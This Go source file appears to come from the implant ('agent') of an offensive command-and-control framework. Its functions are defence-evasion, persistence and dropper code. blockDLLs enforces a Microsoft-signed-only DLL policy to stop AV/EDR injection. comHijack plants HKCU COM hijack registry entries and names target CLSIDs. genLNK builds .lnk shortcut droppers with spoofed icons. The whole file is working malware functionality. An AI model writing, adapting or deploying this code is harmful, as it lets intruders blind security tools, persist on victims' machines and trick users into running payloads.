//go:build windows

package agent

// Miscellaneous evasion/utility features:
//   blockDLLs       — SetProcessMitigationPolicy(ProcessSignaturePolicy) to block
//                     non-Microsoft-signed DLLs (prevents AV/EDR injection)
//   comHijack       — plant a HKCU CLSID registry entry that redirects a COM
//                     class to a custom DLL (user-writable, no admin needed)
//   genLNK          — generate a Windows Shell Link (.lnk) file pointing to any
//                     target command, optionally with a spoofed icon

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ── Blocking DLL policy ───────────────────────────────────────────────────────

var (
	modKernel32bp             = windows.NewLazySystemDLL("kernel32.dll")
	procSetProcessMitigationPolicy = modKernel32bp.NewProc("SetProcessMitigationPolicy")
	procGetProcessMitigationPolicy = modKernel32bp.NewProc("GetProcessMitigationPolicy")
)

const (
	processBinarySignaturePolicy = 8
)

type processBinarySignatureInfo struct {
	Flags uint32
}

// blockDLLs enables or disables the Microsoft binary signature policy for the
// current process. When enabled, Windows will reject any DLL that is not
// signed by Microsoft — this prevents most EDR/AV user-mode injection.
// Requires Windows 10 1607+ (BLOCKDLLS in Cobalt Strike parlance).
func blockDLLs(enable bool) (string, error) {
	var info processBinarySignatureInfo
	if enable {
		// MicrosoftSignedOnly (bit 0) = 1
		info.Flags = 1
	}
	r, _, e := procSetProcessMitigationPolicy.Call(
		processBinarySignaturePolicy,
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 {
		return "", fmt.Errorf("SetProcessMitigationPolicy: %w", e)
	}
	if enable {
		return "[+] blockdlls: Microsoft-signed-only policy ENABLED (non-MS DLLs will be blocked)", nil
	}
	return "[+] blockdlls: binary signature policy DISABLED", nil
}

// ── COM Hijacking ─────────────────────────────────────────────────────────────

// comHijack plants a HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 entry
// pointing to dllPath. When an application loads that CLSID, Windows resolves
// HKCU before HKLM, so our DLL loads instead of the legitimate one.
// No admin privileges required.
//
// Common targets:
//   {9BA05972-F6A8-11CF-A442-00A0C90A8F39}  — ShellWindows (explorer)
//   {1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}  — CLSID_MruPidlList
func comHijack(clsid, dllPath, name string) (string, error) {
	if clsid == "" {
		return "", fmt.Errorf("comhijack: clsid required")
	}
	if dllPath == "" {
		return "", fmt.Errorf("comhijack: dllPath required")
	}
	if name == "" {
		name = "Microsoft Windows"
	}

	keyPath := `Software\Classes\CLSID\` + clsid + `\InprocServer32`
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		keyPath,
		registry.SET_VALUE|registry.CREATE_SUB_KEY,
	)
	if err != nil {
		return "", fmt.Errorf("comhijack registry: %w", err)
	}
	defer key.Close()

	if err := key.SetStringValue("", dllPath); err != nil {
		return "", fmt.Errorf("comhijack set default: %w", err)
	}
	if err := key.SetStringValue("ThreadingModel", "Apartment"); err != nil {
		return "", fmt.Errorf("comhijack ThreadingModel: %w", err)
	}
	return fmt.Sprintf("[+] comhijack: HKCU\\...\\CLSID\\%s\\InprocServer32 → %s", clsid, dllPath), nil
}

// comHijackRemove removes a previously planted HKCU COM hijack entry.
func comHijackRemove(clsid string) (string, error) {
	if clsid == "" {
		return "", fmt.Errorf("comhijack rm: clsid required")
	}
	keyPath := `Software\Classes\CLSID\` + clsid
	if err := registry.DeleteKey(registry.CURRENT_USER, keyPath+`\InprocServer32`); err != nil && !os.IsNotExist(err) {
		return "", fmt.Errorf("comhijack rm InprocServer32: %w", err)
	}
	registry.DeleteKey(registry.CURRENT_USER, keyPath)
	return fmt.Sprintf("[+] comhijack rm: CLSID %s removed from HKCU", clsid), nil
}

// ── LNK Dropper Generator ─────────────────────────────────────────────────────

// Shell Link constants
const (
	lnkHeaderSize      = 0x4C
	lnkMagic           = 0x0000004C
	lnkHasLinkTargetID = 0x00000001
	lnkHasLinkInfo     = 0x00000002
	lnkHasName         = 0x00000004
	lnkHasRelPath      = 0x00000008
	lnkHasWorkingDir   = 0x00000010
	lnkHasArguments    = 0x00000020
	lnkHasIconLocation = 0x00000040
	lnkIsUnicode       = 0x00000080
	lnkShowNormal      = 0x00000001
)

// ShellLinkHeader GUID: 00021401-0000-0000-C000-000000000046
var lnkGUID = []byte{
	0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// genLNK generates a Windows Shell Link (.lnk) file.
// The .lnk format is documented in [MS-SHLLINK].
// This generates a minimal but functional link using the StringData section.
func genLNK(opts GenLNKOptions) (string, error) {
	if opts.Target == "" {
		return "", fmt.Errorf("genlnk: target required")
	}
	if opts.OutFile == "" {
		return "", fmt.Errorf("genlnk: outfile required")
	}
	if opts.WorkingDir == "" {
		opts.WorkingDir = filepath.Dir(opts.Target)
	}
	if opts.IconPath == "" {
		opts.IconPath = opts.Target
	}

	buf := make([]byte, 0, 512)

	// ── ShellLinkHeader (76 bytes / 0x4C) ────────────────────────────────────
	hdr := make([]byte, lnkHeaderSize)
	binary.LittleEndian.PutUint32(hdr[0:], lnkMagic)          // HeaderSize
	copy(hdr[4:], lnkGUID)                                      // LinkCLSID
	flags := uint32(lnkHasName | lnkHasRelPath | lnkHasArguments | lnkHasWorkingDir | lnkHasIconLocation | lnkIsUnicode)
	binary.LittleEndian.PutUint32(hdr[20:], flags)             // LinkFlags
	binary.LittleEndian.PutUint32(hdr[24:], 0x20)              // FileAttributes: FILE_ATTRIBUTE_ARCHIVE
	// FileSize, IconIndex, ShowCommand, HotKey, Reserved — all zero except:
	binary.LittleEndian.PutUint32(hdr[0x44:], uint32(opts.IconIndex)) // IconIndex
	binary.LittleEndian.PutUint32(hdr[0x48:], lnkShowNormal)          // ShowCommand
	buf = append(buf, hdr...)

	// ── StringData (CountedUnicodeString for each string field) ──────────────
	appendUnicodeStr := func(s string) {
		u16 := windows.StringToUTF16(s)
		u16 = u16[:len(u16)-1] // strip null terminator
		lenBuf := make([]byte, 2)
		binary.LittleEndian.PutUint16(lenBuf, uint16(len(u16)))
		buf = append(buf, lenBuf...)
		for _, c := range u16 {
			cb := make([]byte, 2)
			binary.LittleEndian.PutUint16(cb, c)
			buf = append(buf, cb...)
		}
	}

	// NAME_STRING (description) — use target basename
	appendUnicodeStr(strings.TrimSuffix(filepath.Base(opts.Target), filepath.Ext(opts.Target)))
	// RELATIVE_PATH — use "." so relpath block is present (required by the flag)
	appendUnicodeStr(".")
	// WORKING_DIR
	appendUnicodeStr(opts.WorkingDir)
	// COMMAND_LINE_ARGUMENTS
	appendUnicodeStr(opts.Target + " " + opts.Args)
	// ICON_LOCATION
	appendUnicodeStr(opts.IconPath)

	if err := os.WriteFile(opts.OutFile, buf, 0644); err != nil {
		return "", fmt.Errorf("genlnk write: %w", err)
	}
	return fmt.Sprintf("[+] genlnk: %s → %s %s (%d bytes)", opts.OutFile, opts.Target, opts.Args, len(buf)), nil
}
